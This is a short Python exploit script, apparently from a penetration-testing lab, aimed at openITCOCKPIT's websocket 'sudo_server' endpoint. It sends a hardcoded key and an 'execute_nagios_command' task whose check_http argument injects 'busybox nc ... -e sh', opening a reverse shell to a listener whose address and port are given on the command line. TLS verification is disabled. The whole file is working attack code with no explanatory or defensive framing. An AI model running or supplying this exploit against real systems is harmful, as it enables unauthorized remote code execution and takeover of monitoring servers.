#!/usr/bin/env python3

"""
Usage:
python3 simple_ws_rce.py 192.168.45.185 1337
"""

import websocket
import ssl
import json
import traceback
import argparse

def ws_rce(lhost, lport):
    payload = {
        "task": "execute_nagios_command",
        "data": f"./check_http -I {lhost} -p 8000 -k 'test -c 'busybox nc {lhost} {lport} -e sh",
        "uniqid": "",
        "key": "1fea123e07f730f76e661bced33a94152378611e"
    }
    try:
        ws = websocket.create_connection(
            "wss://openitcockpit/sudo_server",
            sslopt={"cert_reqs": ssl.CERT_NONE}
        )
    except Exception as e:
        print("[-] Error establishing the websocket connection: ", e)
        traceback.print_exc()
    try:
        ws.send(json.dumps(payload))
        # uncomment if you want to read the server's response 
        # response = ws.recv()          # blocks until a message arrives
        # print("[+] Server response:", response)
        ws.close()
        print(f"[+] Payload sent. Ckeck your listener {lhost}:{lport}")
    except Exception as e:
        print("[-] Error sending the websocket request: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="OpenITCOCKPIT Websocket RCE")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    ws_rce(args.lhost, args.lport)


if __name__ == "__main__":
    main()
